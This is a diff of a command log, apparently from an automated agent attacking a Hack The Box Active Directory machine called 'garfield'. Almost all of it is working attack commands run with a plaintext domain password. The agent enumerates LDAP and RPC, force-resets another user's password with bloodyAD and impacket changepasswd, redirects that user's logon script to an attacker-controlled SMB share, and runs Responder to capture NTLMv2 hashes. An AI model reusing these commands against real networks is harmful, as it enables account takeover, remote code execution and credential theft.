@@ -1,189 +1,51 @@
-[10:17:37] RUN: ldapsearch -H ldap://10.129.17.178:3268 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(|(sAMAccountName=l.wilson)(sAMAccountName=l.wilson_adm)(sAMAccountName=administrator))' '*' '+' 2>&1 | head -200
-[10:17:39] RUN: curl -sk --max-time 10 https://10.129.17.178:593/ 2>&1; echo "---"; curl -s --max-time 10 http://10.129.17.178:593/ 2>&1; echo "---"; nmap -sV -p 593,9389 --version-intensity 5 -Pn 10.129.17.178 2>&1 | tail -20
-[10:18:44] RUN: nmap -p- --min-rate 5000 -Pn 10.129.17.178 -oN /htb/machines/garfield/scans/full-tcp-178.txt 2>&1
-[10:19:53] RUN: impacket-rpcdump 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978@10.129.17.178' -port 593 2>&1 | head -200
-[10:19:59] RUN: impacket-rpcdump 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978@10.129.17.178' -port 593 2>&1 | grep -E 'ncacn_http|ncacn_ip_tcp|ncacn_np|Protocol:|UUID' | head -80
-[10:20:04] RUN: impacket-rpcdump 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978@10.129.17.178' -port 593 2>&1 | grep -c 'ncacn_http'
-[10:20:07] RUN: impacket-rpcdump 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978@10.129.17.178' -port 593 2>&1 | grep -B5 'ncacn_http'
-[10:20:53] RUN: nmap -p- --min-rate 3000 -Pn 10.129.17.178 -oN /htb/machines/garfield/scans/full-tcp-178.txt 2>&1
-[10:22:45] RUN: echo '' | timeout 10 ncat --ssl 10.129.17.178 2179 2>&1 | xxd | head -20; echo "---EXIT:$?---"
-[10:22:45] RUN: echo '' | timeout 10 ncat 10.129.17.178 2179 2>&1 | xxd | head -20; echo "---EXIT:$?---"
-[10:22:46] RUN: timeout 15 xfreerdp /v:10.129.17.178:2179 /u:j.arbuckle /p:'Th1sD4mnC4t!@1978' /d:garfield.htb /cert:ignore +auth-only 2>&1; echo "---EXIT:$?---"
-[10:22:51] RUN: echo '' | timeout 10 ncat 10.129.17.178 2179 2>&1 | od -A x -t x1z | head -20; echo "---EXIT:$?---"
-[10:22:52] RUN: apt-get install -y freerdp2-x11 2>&1 | tail -5
-[10:22:57] RUN: echo '' | timeout 10 nc -w 5 10.129.17.178 2179 2>&1 | od -A x -t x1z | head -20; echo "---EXIT:$?---"
-[10:22:57] RUN: sudo apt-get install -y freerdp2-x11 2>&1 | tail -5
-[10:23:05] RUN: which nmap python3 curl 2>&1; python3 -c "
-import socket, sys
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(10)
-s.connect(('10.129.17.178', 2179))
-# Send RDP negotiation request (Cookie + NEG_REQ)
-rdp_neg = bytes.fromhex('030000130ee00000000000010008000300000000')
-s.send(rdp_neg)
-data = s.recv(4096)
-print('Received {} bytes'.format(len(data)))
-print('Hex:', data.hex())
-print('ASCII:', repr(data))
-s.close()
-" 2>&1; echo "---EXIT:$?---"
-[10:23:10] RUN: python3 -c "
-import socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(10)
-s.connect(('10.129.17.178', 2179))
-# Just wait for banner
-import select
-ready = select.select([s], [], [], 5)
-if ready[0]:
-    data = s.recv(4096)
-    print('Banner ({} bytes): {}'.format(len(data), data.hex()))
-    print('ASCII:', repr(data))
-else:
-    print('No banner received in 5s, sending probe...')
-    # Try sending HTTP probe
-    s.send(b'GET / HTTP/1.0\r\n\r\n')
-    data = s.recv(4096)
-    print('HTTP response ({} bytes): {}'.format(len(data), repr(data)))
-s.close()
-" 2>&1; echo "---EXIT:$?---"
-[10:23:12] RUN: sudo nmap -sV -p 2179 --script=rdp-enum-encryption,rdp-ntlm-info 10.129.17.178 2>&1; echo "---EXIT:$?---"
-[10:23:33] RUN: nmap -p- -sS --min-rate 3000 -Pn 10.129.17.178 -oN /htb/machines/garfield/scans/full-tcp-178.txt 2>&1
-[10:23:46] RUN: python3 -c "
-import socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(10)
-s.connect(('10.129.17.178', 2179))
-# vmrdp uses a custom protocol - try sending the Hyper-V VM connect magic
-# The protocol starts with a VM GUID negotiation
-# Send minimal bytes to see what error we get
-s.send(b'\x00\x00\x00\x00')
-import select
-ready = select.select([s], [], [], 5)
-if ready[0]:
-    data = s.recv(4096)
-    print('Response ({} bytes): {}'.format(len(data), data.hex()))
-    print('ASCII:', repr(data))
-else:
-    print('No response after 4 null bytes')
-    # Try more data
-    s.send(b'\x01' * 16)
-    ready2 = select.select([s], [], [], 5)
-    if ready2[0]:
-        data = s.recv(4096)
-        print('Response2 ({} bytes): {}'.format(len(data), data.hex()))
-    else:
-        print('Still no response')
-s.close()
-" 2>&1; echo "---EXIT:$?---"
-[10:24:21] RUN: nmap -p 53,88,3389,5985 -sV -Pn 10.129.17.178 2>&1 | head -30
-[10:25:55] RUN: cat /htb/machines/garfield/state/creds.jsonl | grep j.arbuckle
-[10:25:56] RUN: ldapsearch -x -H ldap://10.129.17.178:9389 -b "" -s base 2>&1 | head -20
-[10:26:17] RUN: python3 -c "
-import socket, ssl, struct
-
-# Try raw TCP connection to ADWS port 9389 - .NET Message Framing probe
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.settimeout(10)
-sock.connect(('10.129.17.178', 9389))
-
-# .NET Message Framing: Version Record (0x00) + Mode Record (0x01) + Via Record (0x02)
-# Version: Major=1, Minor=0
-version_record = bytes([0x00, 0x01, 0x00])
-# Mode: Singleton-Unsized (0x01) 
-mode_record = bytes([0x01, 0x01])
-# Via: net.tcp://10.129.17.178:9389/ActiveDirectoryWebServices/Windows
-via_url = b'net.tcp://10.129.17.178:9389/ActiveDirectoryWebServices/Windows'
-via_len = len(via_url)
-via_record = bytes([0x02]) + bytes([via_len]) + via_url
-
-# Send framing preamble
-sock.sendall(version_record + mode_record + via_record)
-
-# Preamble End record
-sock.sendall(bytes([0x0C]))
-
-# Read response
-data = sock.recv(4096)
-print(f'Response bytes: {data.hex()}')
-print(f'Response raw: {data}')
-print(f'Response length: {len(data)}')
-
-# Byte 0 should be 0x0B (Preamble Ack) if server accepts
-if data and data[0] == 0x0b:
-    print('SUCCESS: Server acknowledged .NET Message Framing preamble')
-else:
-    print(f'Server response code: {hex(data[0]) if data else \"empty\"}')
-
-sock.close()
-" 2>&1
-[10:26:19] RUN: curl -s --connect-timeout 10 -H "Content-Type: application/soap+xml" -d '<?xml version="1.0" encoding="utf-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><Enumerate xmlns="http://schemas.xmlsoap.org/ws/2004/09/enumeration"/></s:Body></s:Envelope>' http://10.129.17.178:9389/ActiveDirectoryWebServices/Windows 2>&1 | head -20
-[10:26:29] RUN: # Try with the correct .NET Message Framing - maybe needs Windows upgrade negotiation
-python3 -c "
-import socket
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.settimeout(10)
-sock.connect(('10.129.17.178', 9389))
-
-# .NET Message Framing preamble
-# Version Record: type=0x00, major=1, minor=0  
-version = bytes([0x00, 0x01, 0x00])
-# Mode Record: type=0x01, mode=0x02 (Duplex)
-mode = bytes([0x01, 0x02])
-# Via Record
-via_url = b'net.tcp://10.129.17.178:9389/ActiveDirectoryWebServices/Windows'
-via = bytes([0x02, len(via_url)]) + via_url
-# Upgrade Record for Negotiate auth
-upgrade_type = b'application/negotiate'
-upgrade = bytes([0x09, len(upgrade_type)]) + upgrade_type
-# Preamble End
-preamble_end = bytes([0x0C])
-
-payload = version + mode + via + preamble_end
-sock.sendall(payload)
-
-import select
-ready = select.select([sock], [], [], 5)
-if ready[0]:
-    data = sock.recv(4096)
-    print(f'Response hex: {data.hex()}')
-    print(f'Response len: {len(data)}')
-    if data[0:1] == b'\x0b':
-        print('Preamble ACK received - ADWS accepts connections')
-    elif data[0:1] == b'\x0a':
-        print('Upgrade response received')
-    else:
-        print(f'Unknown response type: {hex(data[0])}')
-else:
-    print('No response within 5s')
-
-sock.close()
-" 2>&1
-[10:26:34] RUN: # ADWS requires Windows Negotiate/Kerberos auth over net.tcp - not feasible from Linux without specialized tooling
-# Check if bloodyAD can use ADWS, and check if there are any Python tools for ADWS
-pip3 list 2>/dev/null | grep -i -E "adws|wcf|soap" ; bloodyAD --help 2>&1 | grep -i adws ; python3 -c "import ADWSpy" 2>&1; which powershell pwsh 2>&1
-[10:26:39] READ: /htb/state/creds.jsonl
-[10:26:40] RUN: nc -vz -w 5 10.129.17.178 2179 2>&1
-[10:26:43] RUN: ncat -vz -w 5 10.129.17.178 2179 2>&1
-[10:26:47] RUN: timeout 5 bash -c 'echo > /dev/tcp/10.129.17.178/2179' 2>&1 && echo "OPEN" || echo "CLOSED/FILTERED"
-[10:26:48] RUN: grep -i "j.arbuckle\|arbuckle" /htb/state/creds.jsonl 2>/dev/null; cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null
-[10:27:06] RUN: timeout 10 xfreerdp /v:10.129.17.178:2179 /u:j.arbuckle /p:'Th1sD4mnC4t!@1978' /d:garfield.htb /cert:ignore +auth-only 2>&1 | head -50
-[10:27:09] RUN: timeout 10 bash -c '(echo -ne "\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"; sleep 2) | openssl s_client -connect 10.129.17.178:2179 -quiet 2>&1' | head -30
-[10:27:14] RUN: which xfreerdp xfreerdp3 rdesktop 2>/dev/null; apt list --installed 2>/dev/null | grep -i rdp
-[10:27:16] RUN: timeout 10 bash -c '(echo -ne "\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"; sleep 3) | cat - <(sleep 3) | openssl s_client -connect 10.129.17.178:2179 -quiet 2>&1' | xxd | head -20
-[10:27:23] RUN: apt-get install -y xfreerdp3 2>&1 | tail -5
-[10:27:27] RUN: sudo apt-get install -y freerdp2-x11 2>&1 | tail -5
-[10:28:31] RUN: bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set password l.wilson 'NewP@ss123!' 2>&1
-[10:28:36] RUN: rpcclient -U 'j.arbuckle%Th1sD4mnC4t!@1978' 10.129.17.178 -c 'setuserinfo2 l.wilson 23 NewP@ss123!' 2>&1
-[10:28:39] RUN: pip install bloodyAD -q 2>&1 | tail -3
-[10:28:42] RUN: pip install bloodyAD -q --break-system-packages 2>&1 | tail -3
-[10:28:46] RUN: bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set password l.wilson 'NewP@ss123!' 2>&1
-[10:28:49] RUN: python3 -m bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set password l.wilson 'NewP@ss123!' 2>&1
-[10:29:30] READ: /htb/state/creds.jsonl
-[10:29:31] READ: /htb/machines/garfield/state/creds.jsonl
-[10:29:42] GREP: l\.wilson|NTLMv2|ntlmv2|5600
-[10:29:42] GREP: l\.wilson|NTLMv2|ntlmv2
-[10:29:45] READ: /htb/machines/garfield/exploits/lwilson_hash.txt
-[10:29:51] READ: /htb/machines/garfield/exploits/gen_liz_wordlist.py
-[10:29:52] RUN: ls /htb/machines/garfield/exploits/
+[10:32:48] RUN: which kpasswd.py smbpasswd.py changepasswd.py 2>/dev/null; find / -name "kpasswd*" -o -name "smbpasswd*" -o -name "changepasswd*" 2>/dev/null | grep -i impacket | head -10
+[10:32:49] RUN: pip list 2>/dev/null | grep -i krb5; dpkg -l | grep -i krb5 | head -5
+[10:32:53] RUN: python3 /usr/share/doc/python3-impacket/examples/changepasswd.py --help 2>&1 | head -30
+[10:32:58] RUN: python3 /usr/share/doc/python3-impacket/examples/changepasswd.py -protocol kpasswd -reset -altuser j.arbuckle -altpass 'Th1sD4mnC4t!@1978' -newpass 'N3wP@ssw0rd!2026' garfield.htb/l.wilson@10.129.17.178 -dc-ip 10.129.17.178 -debug 2>&1
+[10:33:02] RUN: sudo ntpdate -u 10.129.17.178 2>&1
+[10:33:06] RUN: which rdate ntpdate ntpd chronyd faketime 2>/dev/null; apt list --installed 2>/dev/null | grep -i ntp; date -u
+[10:33:12] RUN: faketime -f '+8h0m0s' python3 /usr/share/doc/python3-impacket/examples/changepasswd.py -protocol kpasswd -reset -altuser j.arbuckle -altpass 'Th1sD4mnC4t!@1978' -newpass 'N3wP@ssw0rd!2026' garfield.htb/l.wilson@10.129.17.178 -dc-ip 10.129.17.178 -debug 2>&1
+[10:33:16] RUN: sudo date -s "$(faketime -f '+8h0m0s' date -u '+%Y-%m-%d %H:%M:%S')" 2>&1; date -u
+[10:33:22] RUN: # faketime may not work well with network operations. Let's try datefudge or a different approach.
+# The server time is 18:33 UTC and our time is 10:33 UTC - that's 8 hours difference.
+# Let's try using the net command or a raw Python approach that handles the skew
+# First let's check if we can install ntpdate
+apt list ntpdate 2>/dev/null; which net rdate timedatectl 2>/dev/null
+[10:33:26] RUN: sudo apt-get install -y ntpdate 2>&1 | tail -5
+[10:33:30] RUN: sudo apt-get install -y ntpsec-ntpdate 2>&1 | tail -5
+[10:34:35] READ: /htb/state/creds.jsonl
+[10:34:36] RUN: cat /etc/resolv.conf 2>/dev/null; echo "---"; ip addr show tun0 2>/dev/null | grep inet
+[10:34:43] READ: /htb/machines/garfield/state/creds.jsonl
+[10:34:43] READ: /htb/machines/garfield/notes.md
+[10:34:46] READ: /htb/machines/garfield/notes.md
+[10:34:51] READ: /htb/machines/garfield/notes.md
+[10:34:57] RUN: bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set object 'l.wilson' scriptPath -v '\\10.10.17.114\share\x.bat' 2>&1
+[10:35:01] RUN: which bloodyad bloody-ad python3 -c "import bloodyAD" 2>&1; pip show bloodyAD 2>&1 | head -5
+[10:35:06] RUN: python3 -m bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set object 'l.wilson' scriptPath -v '\\10.10.17.114\share\x.bat' 2>&1
+[10:35:10] RUN: find / -name "bloodyAD" -o -name "bloody*" 2>/dev/null | head -10; pip show bloodyAD 2>&1 | grep Location
+[10:35:23] RUN: /home/hacker/.local/bin/bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set object 'l.wilson' scriptPath -v '\\10.10.17.114\share\x.bat' 2>&1
+[10:36:40] READ: /htb/state/creds.jsonl
+[10:36:41] RUN: ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
+[10:36:44] READ: /htb/machines/garfield/state/creds.jsonl
+[10:36:49] RUN: ldapsearch -x -H ldap://10.129.17.178 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(sAMAccountName=l.wilson_adm)' dn scriptPath 2>&1 | head -20
+[10:36:58] RUN: pkill -f responder 2>/dev/null; sleep 1; sudo responder -I tun0 -v 2>&1 &
+RESPONDER_PID=$!
+echo "Responder PID: $RESPONDER_PID"
+# Wait up to 120 seconds watching for NTLMv2 hashes
+for i in $(seq 1 24); do
+  sleep 5
+  if [ -d /usr/share/responder/logs ] && ls /usr/share/responder/logs/*NTLM* 2>/dev/null; then
+    echo "=== HASH FOUND ==="
+    cat /usr/share/responder/logs/*NTLM* 2>/dev/null
+    break
+  fi
+  # Also check responder's default log locations
+  if [ -d /opt/responder/logs ] && ls /opt/responder/logs/*NTLM* 2>/dev/null; then
+    echo "=== HASH FOUND ==="
+    cat /opt/responder/logs/*NTLM* 2>/dev/null
+    break
+  fi
+  echo "Check $i/24 ($(($i * 5))s) - no hash yet"
+done
+echo "=== Responder output ==="
+cat /tmp/responder_out.txt 2>/dev/null || true
